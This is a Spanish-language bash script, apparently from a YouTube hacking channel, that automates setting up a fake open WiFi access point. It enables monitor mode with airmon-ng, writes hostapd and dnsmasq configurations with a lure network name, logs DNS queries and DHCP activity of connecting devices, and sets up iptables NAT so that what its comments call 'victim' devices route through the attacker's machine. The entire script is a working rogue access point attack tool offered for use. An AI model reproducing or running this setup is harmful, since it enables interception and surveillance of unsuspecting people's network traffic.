#!/bin/bash

echo " "
echo "		  ██▀███   ▒█████    ▄████  █    ██ ▓█████ ▄▄▄       ██▓███	"
echo "		 ▓██ ▒ ██▒▒██▒  ██▒ ██▒ ▀█▒ ██  ▓██▒▓█   ▀▒████▄    ▓██░  ██▒	"
echo "		 ▓██ ░▄█ ▒▒██░  ██▒▒██░▄▄▄░▓██  ▒██░▒███  ▒██  ▀█▄  ▓██░ ██▓▒   "
echo "		 ▒██▀▀█▄  ▒██   ██░░▓█  ██▓▓▓█  ░██░▒▓█  ▄░██▄▄▄▄██ ▒██▄█▓▒ ▒   "
echo "		 ░██▓ ▒██▒░ ████▓▒░░▒▓███▀▒▒▒█████▓ ░▒████▒▓█   ▓██▒▒██▒ ░  ░   "
echo "		 ░ ▒▓ ░▒▓░░ ▒░▒░▒░  ░▒   ▒ ░▒▓▒ ▒ ▒ ░░ ▒░ ░▒▒   ▓▒█░▒▓▒░ ░  ░   "
echo "		   ░▒ ░ ▒░  ░ ▒ ▒░   ░   ░ ░░▒░ ░ ░  ░ ░  ░ ▒   ▒▒ ░░▒ ░	"
echo "		   ░░   ░ ░ ░ ░ ▒  ░ ░   ░  ░░░ ░ ░    ░    ░   ▒   ░░		"
echo "		    ░         ░ ░        ░    ░        ░  ░     ░  ░		"
echo "			                                                      	"
echo " "
echo " "
echo "			   Punto de Acceso Wifi Falso Version 1.0	        "
echo " "
echo " 				   Created BY Anonimo501			"
echo "			      https://youtube.com/c/Anonimo501	 		"
echo " "
echo " "
read -rsp $'Press enter to continue...\n'

echo " "
echo "          *****************************"
echo "          * Se Actualizara el Sistema *"
echo "          *****************************"
echo " "
read -rsp $'Press enter to continue...\n'

# Actualizamos la maquina
sudo apt-get update

echo " "
echo "          *********************************************************************************"
echo "          * Ingresa la interface de Red que deseas poner en modo monitor. Ejemplo: wlan0  *"
echo "          *********************************************************************************"
read interface
# Pondremos la Targeta en modo monitor
airmon-ng start $interface

echo " "
echo "          *****************************************************************************"
echo "          * Ingresa la interface que se encuentra en modo monitor. Ejemplo: wlan0mon  *"
echo "          *****************************************************************************"
read interface_mode_monitor

echo " "
echo " 		****************************************"
echo " 		* Ahora instalaremos hostapd y dnsmasq *"
echo " 		****************************************"
echo " "
read -rsp $'Press enter to continue...\n'
# Instalamos  hostapd y dnsmasq 
apt-get install hostapd dnsmasq

echo " "
echo "          *****************************************************************************"
echo "          * Ingresa el nombre de la Red falsa que deseas crear. Ejemplo: Wifi_Gratis  *"
echo "          *****************************************************************************"
read nombre_de_red

echo " "
echo " "
echo "          *******************************************************************************"
echo "          * Ingresa el Canal/Channel por el cual desear que la red Trabaje. Ejemplo: 7  *"
echo "          *******************************************************************************"
read canal

echo " "
echo "          **********************************************************************************"
echo "          * Ingresa el inicio de Rango de la red que se va a crear. Ejemplo: 192.168.1.100 *"
echo "          **********************************************************************************"
read rango1

echo " "
echo "          ********************************************************************************"
echo "          * Ingresa el fin del Rango de la red que se va a crear. Ejemplo: 192.168.1.200 *"
echo "          ********************************************************************************"
read rango2

###########  la direccion ip que se le va asignar a la targeta de red inalambrica ##########
echo " "
echo "          ****************************************************************************************************"
echo "          * Ingresa la IP que se usara como Gateway (de su interface de  Red/wlan0mon). Ejemplo: 192.168.1.1 *"
echo "          ****************************************************************************************************"
read gateway

echo " "
echo "          *******************************************************************************************************************"
echo "          * Ingresa la IP del DNS que se va a usar Puede ser la misma de la interface de Red/wlan0mon. Ejemplo: 192.168.1.1 *"
echo "          *******************************************************************************************************************"
read dns

echo " "
echo "          ********************************************************************************"
echo "          * Ingresa la IP del server DNS que va a resolver hacia fuera. Ejemplo: 8.8.8.8 *"
echo "          ********************************************************************************"
read dns2

echo " "
echo " 		************************************************************************"
echo " 		* Se crearan dos archivos de configuracion hostapd.conf y dnsmasq.conf *"
echo " 		************************************************************************"
echo " "
read -rsp $'Press enter to continue...\n'

# Archivo de configuracion (hostapd) de Nuestra Red inalanbrica
# Nombre de Red etc.
echo "

interface=$interface_mode_monitor
driver=nl80211
ssid=$nombre_de_red
hw_mode=g
channel=$canal
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0

" >> hostapd.conf

# Archivo de configuracion (dnsmasq) permite entregar ip a los 
# dispositivos victima que se conectaran a nuestra Red.
echo "

interface=$interface_mode_monitor
dhcp-range=$rango1,$rango2,255.255.255.0,12h
dhcp-option=3,$gateway
dhcp-option=6,$dns
server=$dns2
log-queries
log-dhcp
listen-address=127.0.0.1

" >> dnsmasq.conf

echo " "
echo " 		***************************************************************************"
echo " 		* Se establecera la IP de la trajeta de red inalanmbrica de modo monitor. *"
echo " 		***************************************************************************"
echo " "
#read interfaceip
ifconfig $interface_mode_monitor $gateway netmask 255.255.255.0
ifconfig
echo " "
read -rsp $'Press enter to continue...\n'

echo " "
echo " 		***********************************************"
echo " 		* Se creara la tabla de Enrutamiento. 	      *"
echo " 		* ingresa una IP de Red. Ejemplo: 192.168.1.0 *"
echo " 		***********************************************"
echo " "
read ipdered
route add -net $ipdered netmask 255.255.255.0 gw $gateway
route
read -rsp $'Press enter to continue...\n'

echo " "
echo " 		*******************************************************************************"
echo " 		* Ingrese la interface de Red por donde recibe internet. Ejemplo: eth0 - eth1 *"
echo " 		*******************************************************************************"
echo " "
# interface_de_red_de_entrada es la interface por donde el atacante resive internet para que las victimas puedan navegar
read interface_de_red_de_entrada
iptables --table nat --append POSTROUTING --out-interface $interface_de_red_de_entrada -j MASQUERADE
iptables --append FORWARD --in-interface $interface_mode_monitor -j ACCEPT

echo " "
echo " 		*************************************"
echo " 		* Ahora se creara el port fordward. *"
echo " 		*************************************"
echo " "
read -rsp $'Press enter to continue...\n'
echo 1 > /proc/sys/net/ipv4/ip_forward

# Se habilitara los archivos para la escucha de dispositivos Victimas.
gnome-terminal -e "hostapd hostapd.conf"
gnome-terminal -e "dnsmasq -C dnsmasq.conf -d"

